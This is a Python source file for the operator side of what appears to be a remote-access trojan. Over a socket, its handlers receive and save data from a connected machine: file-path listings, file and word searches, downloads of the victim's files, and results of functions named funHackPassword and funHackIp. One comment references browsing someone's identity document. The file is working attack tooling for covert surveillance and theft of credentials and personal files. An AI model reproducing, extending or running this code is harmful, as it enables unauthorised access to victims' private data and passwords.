import platform
import re
import signal
import sys
import os
import time
import traceback
import subprocess
import ipinfo
import socket
import ssl

from tqdm import tqdm
from colorama import Fore
from time import sleep
from socket import *
from os import system
from serverSSLconnection import *
from serverSSLRemoteCommands import *
from serverSSLgeneral import *

FORMAT = "utf-8"

def openZip(comando, clientConnection,fileLog):

    for i in tqdm(range(20), desc=Fore.LIGHTWHITE_EX + "Receiving Information", colour="green", ncols=50, bar_format="{desc}: {percentage:3.0f}% {bar}"):
        sleep(0.2)
    print("Wait...")

    regex_match = regexcheck_openZip(comando)
    if regex_match == 'windowstip1' or regex_match == 'unixtip1':
        try:
            filerecv = clientConnection.recv(1024)
            try:
                fileIf = filerecv.decode(FORMAT)
            except:
                fileIf = ""

            if fileIf[0:7] != "[ERROR]":
                fileLog = fileLog + "\n"
                while (filerecv != b'[END]'):
                    print(fileIf, end="")
                    fileLog = fileLog + fileIf
                    filerecv = clientConnection.recv(1024)
                    fileIf = filerecv.decode(FORMAT)
                print("\n")
                fileLog = fileLog + "\n"
                return fileLog
            else:
                print(fileIf)
                fileLog = fileLog + "\n" +fileIf+"\n"
                return fileLog

        except:
            fileLog = fileLog + "\n" + "Command open gone wrong\n"
            print("Command open gone wrong\n")
            return fileLog

    else:
        print(
            "\nError, incorrect command. The correct command is: " + Fore.GREEN + "open <\"nomeFile.zip\"> <path>" + Fore.RESET)
        fileLog = fileLog + "\n" + "Error, incorrect command\n"
        return fileLog


def filespath(clientConnection,fileLog):

    for i in tqdm(range(20), desc=Fore.LIGHTWHITE_EX + "Receiving Information", colour="green", ncols=50, bar_format="{desc}: {percentage:3.0f}% {bar}"):
        sleep(0.2)
    print("Wait...")

    try:
        nomeFile = "FilesPath.txt"
        file = open(nomeFile, 'ab')
        newNBytes = ""
        try:
            filerecv = clientConnection.recv(1024)
            try:
                fileIf = filerecv.decode(FORMAT)
            except:
                fileIf = ""

            if fileIf[0:7] != "[ERROR]":

                scritti = 0
                while (filerecv != b'[END]'):
                    scritti = scritti + file.write(filerecv)
                    filerecv = clientConnection.recv(1024)

                file.close()

                if os.path.getsize(nomeFile) <= 0:
                    fileLog = fileLog + "\n" + f"File created but not written correctly!\n"
                    print(f"File created but not written correctly!\n")
                    for i in tqdm(range(15), desc=Fore.LIGHTWHITE_EX + "Receiving Information", colour="green",
                                  ncols=50,
                                  bar_format="{desc}: {percentage:3.0f}% {bar}"):
                        sleep(0.2)
                else:
                    fileLog = fileLog + "\n" + f"File successfully created!\n"
                    print(f"File successfully created!\n")
                    time.sleep(2)

                try:
                    if platform.system() == 'Darwin':  # macOS
                        subprocess.call(('open', os.getcwd()+"/"+nomeFile))
                    elif platform.system() == 'Windows':  # Windows
                        os.startfile(os.getcwd()+"\\"+nomeFile)
                    else:  # linux variants
                        subprocess.call(('xdg-open', os.getcwd()+"/"+nomeFile))
                except:
                    pass

                return fileLog
            else:
                print(fileIf)
                fileLog = fileLog + "\n" + fileIf + "\n"
                return fileLog
        except:
            fileLog = fileLog + "\n" + "Command Filespath gone wrong\n"
            print("Command Filespath gone wrong\n")
            return fileLog
    except:
        #traceback.print_exc()
        fileLog = fileLog + "\n" + "Command Filespath gone wrong\n"
        print("Command Filespath gone wrong\n")
        return fileLog


def searchFile(clientConnection,fileLog):

    for i in tqdm(range(20), desc=Fore.LIGHTWHITE_EX + "Receiving Information", colour="green", ncols=50,
                  bar_format="{desc}: {percentage:3.0f}% {bar}"):
        sleep(0.2)
    print("Wait...")

    try:
        nomeFile = "searchFile.txt"
        file = open(nomeFile, 'ab')
        filerecv = clientConnection.recv(1024)
        try:
            fileIf = filerecv.decode(FORMAT)
        except:
            fileIf = ""

        if fileIf[0:7] != "[ERROR]":
            fileLog = fileLog + "\n"
            scritti = 0
            while (filerecv != b'[END]'):
                print(fileIf, end="")
                scritti = scritti + file.write(filerecv)
                fileLog = fileLog + fileIf
                filerecv = clientConnection.recv(1024)
                fileIf = filerecv.decode(FORMAT)

            file.close()
            if os.path.getsize(nomeFile) <= 0:
                fileLog = fileLog + "\n" + f"File created but not written correctly!\n"
                print(f"File created but not written correctly!\n")
                for i in tqdm(range(15), desc=Fore.LIGHTWHITE_EX + "Receiving Information", colour="green",
                              ncols=50,
                              bar_format="{desc}: {percentage:3.0f}% {bar}"):
                    sleep(0.2)
            else:
                fileLog = fileLog + "\n" + f"\nFile successfully created!\n"
                print(f"\nFile successfully created!\n")
                time.sleep(2)

            try:
                if platform.system() == 'Darwin':  # macOS
                    subprocess.call(('open', os.getcwd() + "/" + nomeFile))
                elif platform.system() == 'Windows':  # Windows
                    os.startfile(os.getcwd() + "\\" + nomeFile)
                else:  # linux variants
                    subprocess.call(('xdg-open', os.getcwd() + "/" + nomeFile))
            except:
                pass

            print("\n")
            fileLog = fileLog + "\n"
            return fileLog

        else:
            print(fileIf)
            fileLog = fileLog + "\n" + fileIf + "\n"
            return fileLog

    except:
        fileLog = fileLog + "\n" + "Command search gone wrong\n"
        print("Command search gone wrong\n")
        return fileLog


def searchWord(clientConnection, fileLog, comando):

    for i in tqdm(range(20), desc=Fore.LIGHTWHITE_EX + "Receiving Information", colour="green", ncols=50,
                  bar_format="{desc}: {percentage:3.0f}% {bar}"):
        sleep(0.2)
    print("Wait...")

    regex_match = regexcheck_wsearch(comando)
    if regex_match == 'windowstip1' or regex_match == 'unixtip1':
        try:
            nomeFile = "searchWord.txt"
            file = open(nomeFile, 'ab')
            filerecv = clientConnection.recv(1024)
            try:
                fileIf = filerecv.decode(FORMAT)
            except:
                fileIf = ""

            if fileIf[0:7] != "[ERROR]":
                fileLog = fileLog + "\n"
                scritti = 0
                while (filerecv != b'[END]'):
                    print(fileIf, end="")
                    scritti = scritti + file.write(filerecv)
                    fileLog = fileLog + fileIf
                    filerecv = clientConnection.recv(1024)
                    fileIf = filerecv.decode(FORMAT)

                file.close()
                if os.path.getsize(nomeFile) <= 0:
                    fileLog = fileLog + "\n" + f"File created but not written correctly!\n"
                    print(f"File created but not written correctly!\n")
                    for i in tqdm(range(15), desc=Fore.LIGHTWHITE_EX + "Receiving Information", colour="green",
                                  ncols=50,
                                  bar_format="{desc}: {percentage:3.0f}% {bar}"):
                        sleep(0.2)

                else:
                    fileLog = fileLog + "\n" + f"\nFile successfully created!\n"
                    print(f"\nFile successfully created!\n")
                    time.sleep(2)

                try:
                    if platform.system() == 'Darwin':  # macOS
                        subprocess.call(('open', os.getcwd() + "/" + nomeFile))
                    elif platform.system() == 'Windows':  # Windows
                        os.startfile(os.getcwd() + "\\" + nomeFile)
                    else:  # linux variants
                        subprocess.call(('xdg-open', os.getcwd() + "/" + nomeFile))
                except:
                    pass

                print("\n")
                fileLog = fileLog + "\n"
                return fileLog

            else:
                print(fileIf)
                fileLog = fileLog + "\n" + fileIf + "\n"
                return fileLog

        except:
            fileLog = fileLog + "\n" + "Command search gone wrong\n"
            print("Command search gone wrong\n")
            return fileLog
    else:
        print(
            "\nError, incorrect command. The correct command is: " + Fore.GREEN + "wsearch <\"word\"> <path>" + Fore.RESET)
        fileLog = fileLog + "\n" + "Error, incorrect command\n"


def download(comando,clientConnection,fileLog):

    nomeFile='null'
    inizio_file='null'
    fine_file='null'
    counter_virgolette=0
    regex_match = regexcheck_download(comando)
    if regex_match != 'null' and regex_match != 'not matched':
        if regex_match == 'windowstip1'or regex_match == 'unixtip1':
            #tipologia 1: (simile a find) download "nomefile.estensione" path
            for element in range(0, len(comando)):
                if comando[element] == "\"":
                    counter_virgolette += 1
                    if counter_virgolette == 1:
                        inizio_file = element+1
                    elif counter_virgolette == 2:
                        fine_file = element
                        break
        elif regex_match == 'windowstip2' or regex_match == 'unixtip2':
            #tipologia 2: (il risultato di filespath) "Carta di identità cartacea titolare.pdf" nel percorso: /Users/erasmo/Desktop
            for element in range(0, len(comando)):
                if comando[element] == "\"":
                    counter_virgolette += 1
                    if counter_virgolette == 1:
                        inizio_file = element+1
                    elif counter_virgolette == 2:
                        fine_file = element
                        break
        try:
            if inizio_file != 'null' and fine_file != 'null':
                nomeFile=comando[inizio_file:fine_file]
                file = open(nomeFile, 'wb')
                lunghezzacmd = len(nomeFile)

                for i in tqdm(range(17), desc=Fore.LIGHTWHITE_EX + f"Downloading \"{nomeFile}\"...", colour="green",
                              ncols=45 + lunghezzacmd, bar_format="{desc}: {percentage:3.0f}% {bar}"):
                    time.sleep(0.2)

                filerecv = clientConnection.recv(1024)
                try:
                    fileIf = filerecv.decode(FORMAT)
                except:
                    fileIf = ""
                if fileIf[0:7] != "[ERROR]":
                    scritti = 0
                    while (filerecv != b'[END]'):
                        scritti = scritti + file.write(filerecv)
                        filerecv = clientConnection.recv(1024)

                    file.close()

                    if os.path.getsize(nomeFile) <= 0:
                        fileLog = fileLog + "\n" + "Download failed\n" + "\n"
                        print("Download failed\n")
                        os.remove(nomeFile)
                    elif scritti < os.path.getsize(nomeFile):
                        fileLog = fileLog + "\n" + "Download failed\n" + "\n"
                        print("Download failed\n")
                        os.remove(nomeFile)
                    else:
                        fileLog = fileLog + "\n" + f"File {nomeFile} successfully downloaded\n" + "\n"
                        print(f"File {nomeFile} successfully downloaded\n")
                    time.sleep(2)
                    return nomeFile, fileLog

                else:
                    print(fileIf)
                    fileLog = fileLog + "\n" + fileIf + "\n"
                    return "[ERROR]", fileLog

            else:
                print("Couldn't take start and end point of the file's name")
                error = clientConnection.recv(256).decode(FORMAT)
                fileLog = fileLog + "\n" + "Couldn't take start and end point of the file's name" + "\n"
                print("Download failed\n")
                try:
                    os.remove(nomeFile)
                except:
                    pass
                fileLog = fileLog + "\n" + "Download failed\n"
                return "[ERROR]", fileLog
        except:
            print("Download failed\n")
            try:
                os.remove(nomeFile)
            except:
                pass
            fileLog = fileLog + "\n" + "Download failed\n"
            return "[ERROR]", fileLog
    else:
        print(
            "\nError, incorrect command. The correct command is: " + Fore.GREEN + "download <\"filename.exstension\"> <path>" + Fore.RESET)
        fileLog = fileLog + "\n" + "Error, incorrect command\n"
        return "[ERROR]", fileLog


def funHackPassword(clientConnection,fileLog):

    for i in tqdm(range(20), desc=Fore.LIGHTWHITE_EX + "Receiving Information", colour="green", ncols=50, bar_format="{desc}: {percentage:3.0f}% {bar}"):
        sleep(0.2)
    print("Wait...")

    try:
        nomeFile = "funHackPassword.txt"
        file = open(nomeFile, 'ab')
        newNBytes = ""
        try:
            filerecv = clientConnection.recv(1024)
            try:
                fileIf = filerecv.decode(FORMAT)
            except:
                fileIf = ""

            if fileIf[0:7] != "[ERROR]":

                scritti = 0
                while (filerecv != b'[END]'):
                    print(filerecv.decode(FORMAT))
                    scritti = scritti + file.write(filerecv)
                    filerecv = clientConnection.recv(1024)

                file.close()

                if os.path.getsize(nomeFile) <= 0:
                    fileLog = fileLog + "\n" + f"File created but not written correctly!\n"
                    print(f"File created but not written correctly!\n")
                    for i in tqdm(range(15), desc=Fore.LIGHTWHITE_EX + "Receiving Information", colour="green",
                                  ncols=50,
                                  bar_format="{desc}: {percentage:3.0f}% {bar}"):
                        sleep(0.2)

                else:
                    fileLog = fileLog + "\n" + f"File successfully created!\n"
                    print(f"File successfully created!\n")
                    time.sleep(2)

                try:
                    if platform.system() == 'Darwin':  # macOS
                        subprocess.call(('open', os.getcwd()+"/"+nomeFile))
                    elif platform.system() == 'Windows':  # Windows
                        os.startfile(os.getcwd()+"\\"+nomeFile)
                    else:  # linux variants
                        subprocess.call(('xdg-open', os.getcwd()+"/"+nomeFile))
                except:
                    pass

                return fileLog

            else:
                print(fileIf)
                fileLog = fileLog + "\n" + fileIf + "\n"
                return fileLog
        except:
            fileLog = fileLog + "\n" + "Command password gone wrong\n"
            print("Command password gone wrong\n")
            return fileLog
    except:
        #traceback.print_exc()
        fileLog = fileLog + "\n" + "Command password gone wrong\n"
        print("Command password gone wrong\n")
        return fileLog


def funHackIp(clientConnection,fileLog):

    for i in tqdm(range(20), desc=Fore.LIGHTWHITE_EX + "Receiving Information", colour="green", ncols=50, bar_format="{desc}: {percentage:3.0f}% {bar}"):
        sleep(0.2)
    print("Wait...")

    try:
        nomeFile = "funHackIp.txt"
        file = open(nomeFile, 'ab')
        newNBytes = ""
        try:
            filerecv = clientConnection.recv(1024)
            try:
                fileIf = filerecv.decode(FORMAT)
            except:
                fileIf = ""

            if fileIf[0:7] != "[ERROR]":

                scritti = 0
                while (filerecv != b'[END]'):
                    print(filerecv.decode(FORMAT))
                    scritti = scritti + file.write(filerecv)
                    filerecv = clientConnection.recv(1024)

                file.close()

                if os.path.getsize(nomeFile) <= 0:
                    fileLog = fileLog + "\n" + f"File created but not written correctly!\n"
                    print(f"File created but not written correctly!\n")
                    for i in tqdm(range(15), desc=Fore.LIGHTWHITE_EX + "Receiving Information", colour="green",
                                  ncols=50,
                                  bar_format="{desc}: {percentage:3.0f}% {bar}"):
                        sleep(0.2)

                else:
                    fileLog = fileLog + "\n" + f"File successfully created!\n"
                    print(f"File successfully created!\n")
                    time.sleep(2)

                try:
                    if platform.system() == 'Darwin':  # macOS
                        subprocess.call(('open', os.getcwd()+"/"+nomeFile))
                    elif platform.system() == 'Windows':  # Windows
                        os.startfile(os.getcwd()+"\\"+nomeFile)
                    else:  # linux variants
                        subprocess.call(('xdg-open', os.getcwd()+"/"+nomeFile))
                except:
                    pass

                return fileLog

            else:
                print(fileIf)
                fileLog = fileLog + "\n" + fileIf + "\n"
                return fileLog
        except:
            fileLog = fileLog + "\n" + "Command ip gone wrong\n"
            print("Command ip gone wrong\n")
            return fileLog
    except:
        #traceback.print_exc()
        fileLog = fileLog + "\n" + "Command ip gone wrong\n"
        print("Command ip gone wrong\n")
        return fileLog


def printFile(clientConnection, fileLog):

    for i in tqdm(range(20), desc=Fore.LIGHTWHITE_EX + "Receiving Information", colour="green", ncols=50,
                  bar_format="{desc}: {percentage:3.0f}% {bar}"):
        sleep(0.2)
    print("Wait...")

    try:
        filerecv = clientConnection.recv(1024)
        try:
            fileIf = filerecv.decode(FORMAT)
        except:
            fileIf = ""

        if fileIf[0:7] != "[ERROR]":
            fileLog = fileLog + "\n"
            scritti = 0
            while (filerecv != b'[END]'):
                print(fileIf, end="")
                fileLog = fileLog + fileIf
                filerecv = clientConnection.recv(1024)
                fileIf = filerecv.decode(FORMAT)
            print("\n")
            fileLog = fileLog + "\n"
            return fileLog

        else:
            print(fileIf)
            fileLog = fileLog + "\n" + fileIf + "\n"
            return fileLog

    except:
        fileLog = fileLog + "\n" + "Command search gone wrong\n"
        print("Command search gone wrong\n")
        return fileLog

